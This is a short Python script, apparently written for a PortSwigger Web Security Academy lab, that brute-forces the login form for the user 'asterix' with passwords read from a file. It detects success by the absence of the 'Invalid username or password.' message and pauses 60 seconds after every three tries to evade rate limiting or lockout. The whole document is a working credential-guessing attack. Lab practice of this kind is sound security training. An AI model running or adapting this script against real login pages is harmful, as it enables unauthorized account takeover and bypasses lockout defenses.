import requests
import re
import time

passwords = open("passwords.txt","r")
t=0

for i in passwords:
	data = {"username":"asterix","password":i.strip()}
	respuesta = requests.post("https://0ae80052037de04d839cfaf5006d008b.web-security-academy.net/login", data=data)
	coincidencia = re.findall("Invalid username or password.",respuesta.text)
	t = t+1
	if coincidencia == []:
		print("Password encontrado: "+i.strip())
	if t == 3:
		t = 0
		time.sleep(60)
	 	
